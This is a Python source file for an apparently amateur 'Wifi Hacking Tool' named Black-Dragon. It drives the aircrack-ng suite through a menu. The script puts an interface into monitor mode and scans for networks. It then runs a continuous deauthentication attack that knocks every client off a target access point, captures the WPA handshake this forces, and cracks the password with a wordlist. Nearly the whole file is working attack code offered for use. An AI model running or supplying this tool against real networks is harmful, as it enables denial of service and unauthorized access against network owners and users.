import subprocess
import sys
import os
import colored
from colored import fg
import pandas
import keyboard
import time

color1 = fg("red")
color2 = fg("yellow")
color3 = fg("white")
color4 = fg("green")

if not 'SUDO_UID' in os.environ.keys():
	print(color1 + "This Script Needs sudo Privelages!!!")
	print(color2 + "Try running with sudo...")
	sys.exit()



print(r"""
	   (    (                    )             
 ( )\   )\      )         ( /(             
 )((_) ((_)  ( /(    (    )\())            
((_)_   _    )(_))   )\  ((_)\             
 | _ ) | |  ((_)_   ((_) | |(_)            
 | _ \ | |  / _` | / _|  | / /             
 (___/ |_|  \__,_| \__|  |_\_\             
 )\ )                                      
(()/(    (        )   (  (                 
 /(_))   )(    ( /(   )\))(    (     (     
(_))_   (()\   )(_)) ((_))\    )\    )\ )  
 |   \   ((_) ((_)_   (()(_)  ((_)  _(_/(  
 | |) | | '_| / _` | / _` |  / _ \ | ' \)) 
 |___/  |_|   \__,_| \__, |  \___/ |_||_|  
                     |___/                 
	""")

print("""\n
###################################################################
#Script Name	: Black-Dragon                                                                                             
#Description	: A Python Wifi Hacking Tool..                                                                                                                                                                           
#Author       	:Blackie007 (aka) Abinavv                                               
#Email         	:devilgamingyt1234@gmail.com                                           
###################################################################
	""")




#print("Black Dragon by Blackie")

print("\n 1. Select and Put Interface in monitor mode")
print("\n 2. Scan for Targets")
print("\n 3. Disable monitor mode")
print("\n 4. Deauth all Clients")
print("\n 5. Capture WPA Handshake")
print("\n 6. Crack Passwords ")
print(color2 + "\nWarning This Script Will not Work If the Interface is not in monitor mode!!!")

print(color3 + "q = exit")

def sel_iface():
	subprocess.run("iwconfig")
	#print(warning)
	iface = input("Select The Interface : ")
	subprocess.run(["airmon-ng", "start" , iface])

def disable_mon():
	subprocess.run(["airmon-ng" , "stop" , "wlan0mon"])

def scan_targets():
	print("CTRL + C to stop....")
	target = subprocess.run(["xterm" , "-T" , "scanning" , "-e" , "airodump-ng" , "-w", "file" , "--write-interval", "1", "--output-format", "csv", "wlan0mon"])
	scan_file = pandas.read_csv("file-01.csv")
	print(scan_file)
	print(color4 + "Copy The bssid of the target")
	print(color3 + "...")

	
def dos_wifi():
	tar_bssid = input("Target's BSSID : ")
	tar_chan = input("Target's Channel : ")
	print(color4 + "CTRL + C , When You see your target and Start The Deauth attack....")
	cha_tar = subprocess.run(["xterm", "-T", "fixing-channel" , "-e" , "airodump-ng", "-c", tar_chan, "wlan0mon"])
	print("CTRL + C To Stop...")
	dos_tar = subprocess.run(["xterm", "-T", "deauthing" , "-e" , "aireplay-ng", "--deauth" , "0" , "-a" , tar_bssid,
		"wlan0mon"])

def handshake():
	wpa_bssid = input("Target's BSSID : ")
	wpa_chan = input("Target's Channel : ")	
	run_input = input("Start The Capture [y/n] : ")
	if run_input == "y":
		capture(wpa_bssid ,wpa_chan)
	print(color4 + "Handshake Captured Successfull...")
	print(color3 + "File Name : capture1-01.cap")

def capture(wpa_bssid , wpa_chan):
	subprocess.Popen(["xterm","-T", "capturing", "-e","airodump-ng", "-w" , "capture","-c" , wpa_chan, "--bssid" ,wpa_bssid, "wlan0mon"])
	time.sleep(4)
	subprocess.Popen(["xterm","-T", "deauthing", "-e", "aireplay-ng", "--deauth", "0", "-a" , wpa_bssid, "wlan0mon"])


def crack():
	crack_bssid = input("Target's BSSID : ")
	cap_file = input("Handshake File : ")
	#default_path = "/opt/Kalilists/rockyou.txt"
	wordlist = input("Wordlist Path [default : rockyou.txt] : ")
	'''if wordlist == "":
		wordlist = default_path'''
	subprocess.Popen(["aircrack-ng" , "-b" , crack_bssid , "-w" , wordlist , cap_file])


while True:
	user_input = input("Choose any one [1-6] : ")

	if "q" in user_input:
		subprocess.run(["rm", "file-0*.*"])
		subprocess.run(["rm", "capture-0*.*"])
		#subprocess.run()
		sys.exit()

	if "1" in user_input:
		sel_iface()	

	if "2" in user_input:
		scan_targets()

	if "3" in user_input:
		disable_mon()

	if "4" in user_input:
		dos_wifi()

	if "5" in user_input:
		handshake()

	if "6" in user_input:
		crack()